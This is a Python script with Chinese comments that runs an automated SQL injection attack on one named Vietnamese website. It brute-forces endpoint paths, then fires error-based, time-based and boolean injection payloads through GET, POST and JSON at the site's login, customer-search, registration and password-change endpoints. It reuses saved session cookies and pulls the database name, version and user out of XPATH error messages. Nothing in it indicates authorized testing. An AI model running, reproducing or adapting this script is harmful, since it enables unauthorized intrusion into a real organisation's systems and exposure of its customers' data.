#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class UltimateScanner:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerabilities = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def brute_force_all_paths(self):
        """暴力枚举所有路径"""
        print("[*] 暴力枚举所有路径...")
        
        base_paths = ['', '/Account', '/Handle', '/Admin', '/api', '/Api', '/API', '/User', '/Customer', '/Order', '/Report', '/Data', '/File']
        actions = ['Get', 'List', 'Search', 'Find', 'Query', 'Load', 'Fetch', 'Retrieve', 'User', 'Users', 'Info', 'Details', 'Profile', 'ById', 'GetById', 'GetUser', 'GetUserInfo', 'GetUserById', 'SearchList', 'GetList']
        suffixes = ['', 'ById', 'Info', 'Details', 'List', 'Search', 'Query']
        
        found = []
        for base in base_paths:
            for action in actions:
                for suffix in suffixes:
                    endpoints = [
                        f"{base}/{action}{suffix}",
                        f"{base}/{action.lower()}{suffix.lower()}",
                        f"{base}/{action.upper()}{suffix.upper()}",
                    ]
                    
                    for endpoint in endpoints:
                        url = f"{self.base_url}{endpoint}?id=1"
                        try:
                            r = self.session.get(url, timeout=5)
                            if r.status_code in [200, 500, 403]:
                                print(f"    [+] {endpoint}: {r.status_code}")
                                found.append(endpoint)
                        except:
                            pass
        
        return found
    
    def test_endpoint_sqli(self, endpoint, params=None):
        """测试端点SQL注入"""
        if not params:
            params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone']
        
        sqli_payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
            "1' OR '1'='1",
            "1' AND 1=1--",
            "1' AND 1=2--",
        ]
        
        for param in params:
            for payload in sqli_payloads:
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                try:
                    start = time.time()
                    r = self.session.get(url, timeout=15)
                    elapsed = time.time() - start
                    
                    has_test = 'TEST' in r.text
                    has_xpath = 'XPATH' in r.text.upper()
                    has_delay = elapsed > 4
                    has_error = 'error' in r.text.lower() or 'sql' in r.text.lower()
                    
                    if has_test or has_xpath or has_delay or has_error:
                        print(f"    [!] SQL注入: {endpoint} [{param}]")
                        if has_test:
                            print(f"        [+] 包含TEST")
                        if has_xpath:
                            print(f"        [+] XPATH错误")
                            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                            if match:
                                print(f"        [+] 提取值: {match.group(1)}")
                                return endpoint, param, match.group(1)
                        if has_delay:
                            print(f"        [+] 时间延迟: {elapsed:.2f}s")
                        return endpoint, param, None
                except:
                    pass
        
        return None, None, None
    
    def test_all_discovered_endpoints(self):
        """测试所有发现的端点"""
        print("[*] 测试所有发现的端点...")
        
        endpoints = [
            '/Account/JLogin',
            '/Account/Logout',
            '/Account/RegisterView',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
            '/Handle/SearchListDistrictByProvinceID',
        ]
        
        working = []
        for endpoint in endpoints:
            endpoint, param, value = self.test_endpoint_sqli(endpoint)
            if endpoint:
                working.append((endpoint, param, value))
                if value:
                    self.db_info['extracted'] = value
        
        return working
    
    def test_post_all_endpoints(self):
        """测试所有端点POST"""
        print("[*] 测试所有端点POST...")
        
        endpoints = [
            '/Account/JLogin',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Account/Register',
            '/Account/ChangePassword',
            '/Account/UpdateProfile',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            # 测试所有可能的参数
            test_data = {
                'id': payload,
                'ID': payload,
                'MobileNumber': payload,
                'Email': payload,
                'Password': payload,
                'q': payload,
                'search': payload,
                'query': payload,
                'Type': payload,
                'DistrictID': payload,
            }
            
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", data=test_data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] POST注入: {endpoint}")
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        print(f"        [+] 提取: {match.group(1)}")
                        return endpoint, match.group(1)
            except:
                pass
        
        return None, None
    
    def test_json_all_endpoints(self):
        """测试所有端点JSON"""
        print("[*] 测试所有端点JSON...")
        
        endpoints = [
            '/Account/JLogin',
            '/Handle/SearchListCustomer',
            '/api/users',
            '/api/user',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            test_data = {
                'id': payload,
                'MobileNumber': payload,
                'q': payload,
            }
            
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", json=test_data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] JSON注入: {endpoint}")
                    return endpoint
            except:
                pass
        
        return None
    
    def extract_with_working_endpoint(self, endpoint, param, method='GET'):
        """使用有效端点提取数据库"""
        print(f"\n[*] 使用有效端点提取: {endpoint}")
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                r = self.session.get(url, timeout=10)
            else:
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
            
            # 提取值
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                value = match.group(1)
                print(f"    [+] {label}: {value}")
                self.db_info[label] = value
                return value
        
        return None
    
    def run_all(self):
        """执行所有扫描"""
        print("="*60)
        print("全面SQL注入扫描")
        print("="*60)
        
        # 1. 测试所有发现的端点
        working = self.test_all_discovered_endpoints()
        
        # 2. 测试POST注入
        post_endpoint, post_value = self.test_post_all_endpoints()
        
        # 3. 测试JSON注入
        json_endpoint = self.test_json_all_endpoints()
        
        # 4. 使用有效端点提取
        if working:
            for endpoint, param, value in working:
                if value:
                    self.db_info['database'] = value
                else:
                    self.extract_with_working_endpoint(endpoint, param)
        
        if post_endpoint and post_value:
            self.db_info['database'] = post_value
        
        # 保存结果
        with open('ultimate_scan_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'vulnerabilities': self.vulnerabilities,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("扫描结果")
        print("="*60)
        for k, v in self.db_info.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    scanner = UltimateScanner()
    scanner.run_all()